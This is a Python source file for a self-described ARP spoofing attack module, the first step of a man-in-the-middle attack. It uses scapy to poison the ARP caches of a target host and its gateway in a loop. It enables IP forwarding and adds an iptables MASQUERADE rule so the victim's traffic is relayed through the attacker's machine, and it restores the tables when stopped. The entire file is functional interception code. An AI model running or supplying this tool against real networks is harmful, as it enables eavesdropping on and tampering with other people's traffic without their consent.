#!/usr/bin/env python3
"""
ARP Spoofing Attack Module
Implements the first step of MITM attack: ARP spoofing
"""

import time
import sys
import subprocess
from scapy.all import ARP, send, get_if_hwaddr, get_if_addr, get_if_list
import threading

class ARPSpoofer:
    def __init__(self, target_ip, gateway_ip, interface=None):
        """
        Initialize ARP spoofer
        
        Args:
            target_ip: Target IP address
            gateway_ip: Gateway IP address
            interface: Network interface
        """
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.spoofing = False
        self.spoof_thread = None
        self.ip_forward_enabled = False
        self.iptables_rules_added = False
        
        # If no interface specified, get default interface
        if not self.interface:
            self.interface = self._get_default_interface()
        
        # Get local MAC address
        try:
            self.attacker_mac = get_if_hwaddr(self.interface)
        except Exception as e:
            print(f"Warning: Unable to get MAC address for interface {self.interface}: {e}")
            # Try using the first available interface
            interfaces = get_if_list()
            if interfaces:
                self.interface = interfaces[0]
                self.attacker_mac = get_if_hwaddr(self.interface)
            else:
                raise Exception("Unable to find available network interface")
    
    def _get_default_interface(self):
        """Get default network interface"""
        try:
            # Get all interfaces
            interfaces = get_if_list()
            # Filter out loopback interfaces
            non_loopback = [iface for iface in interfaces if not iface.startswith('lo')]
            if non_loopback:
                return non_loopback[0]
            # If no non-loopback interface, return first interface
            if interfaces:
                return interfaces[0]
            # Default to eth0
            return 'eth0'
        except:
            return 'eth0'
    
    def get_mac(self, ip):
        """Get MAC address for specified IP"""
        from scapy.all import Ether, srp
        
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
        
        if answered_list:
            return answered_list[0][1].hwsrc
        return None
    
    def spoof(self, target_ip, spoof_ip):
        """Send ARP spoofing packet"""
        target_mac = self.get_mac(target_ip)
        if target_mac:
            packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                        psrc=spoof_ip)
            send(packet, verbose=False, iface=self.interface)
    
    def restore(self, destination_ip, source_ip):
        """Restore ARP table"""
        destination_mac = self.get_mac(destination_ip)
        source_mac = self.get_mac(source_ip)
        
        if destination_mac and source_mac:
            packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
                        psrc=source_ip, hwsrc=source_mac)
            send(packet, count=4, verbose=False, iface=self.interface)
    
    def _enable_ip_forwarding(self):
        """Enable IP forwarding"""
        try:
            # Check current IP forwarding status
            result = subprocess.run(['sysctl', 'net.ipv4.ip_forward'], 
                                   capture_output=True, text=True)
            if '1' not in result.stdout:
                # Enable IP forwarding
                subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], check=True)
                self.ip_forward_enabled = True
                print("[+] IP forwarding enabled")
            else:
                print("[*] IP forwarding already enabled")
        except Exception as e:
            print(f"[!] Failed to enable IP forwarding: {e}")
            print("[!] Hint: Root privileges required")
    
    def _disable_ip_forwarding(self):
        """Disable IP forwarding (restore original state)"""
        if self.ip_forward_enabled:
            try:
                subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], check=True)
                print("[+] IP forwarding disabled")
            except Exception as e:
                print(f"[!] Failed to disable IP forwarding: {e}")
    
    def _setup_iptables(self):
        """Set up iptables rules to allow forwarding"""
        try:
            # Allow forwarding traffic
            subprocess.run(['iptables', '-t', 'nat', '-A', 'POSTROUTING', 
                          '-o', self.interface, '-j', 'MASQUERADE'], check=True)
            self.iptables_rules_added = True
            print("[+] iptables rules configured")
        except Exception as e:
            print(f"[!] Failed to set up iptables rules: {e}")
            print("[!] Hint: Root privileges required")
    
    def _cleanup_iptables(self):
        """Clean up iptables rules"""
        if self.iptables_rules_added:
            try:
                # Delete MASQUERADE rule
                subprocess.run(['iptables', '-t', 'nat', '-D', 'POSTROUTING', 
                              '-o', self.interface, '-j', 'MASQUERADE'], check=False)
                print("[+] iptables rules cleaned up")
            except Exception as e:
                print(f"[!] Failed to clean up iptables rules: {e}")
            self.iptables_rules_added = False
    
    def _spoof_loop(self):
        """ARP spoofing loop"""
        while self.spoofing:
            # Spoof target: tell target our MAC is gateway's MAC
            self.spoof(self.target_ip, self.gateway_ip)
            # Spoof gateway: tell gateway our MAC is target's MAC
            self.spoof(self.gateway_ip, self.target_ip)
            time.sleep(2)
    
    def start(self):
        """Start ARP spoofing"""
        if self.spoofing:
            return False
        
        # Enable IP forwarding
        self._enable_ip_forwarding()
        
        # Set up iptables rules
        self._setup_iptables()
        
        self.spoofing = True
        self.spoof_thread = threading.Thread(target=self._spoof_loop, daemon=True)
        self.spoof_thread.start()
        print(f"[+] ARP spoofing started: {self.target_ip} <-> {self.gateway_ip}")
        return True
    
    def stop(self):
        """Stop ARP spoofing and restore ARP table"""
        if not self.spoofing:
            return False
        
        self.spoofing = False
        if self.spoof_thread:
            self.spoof_thread.join(timeout=3)
        
        print("[+] Restoring ARP table...")
        self.restore(self.target_ip, self.gateway_ip)
        self.restore(self.gateway_ip, self.target_ip)
        print("[+] ARP table restored")
        
        # Clean up iptables rules
        self._cleanup_iptables()
        
        # Note: Do not automatically disable IP forwarding as it may be used by other processes
        # If needed, manually run: sudo sysctl -w net.ipv4.ip_forward=0
        
        return True


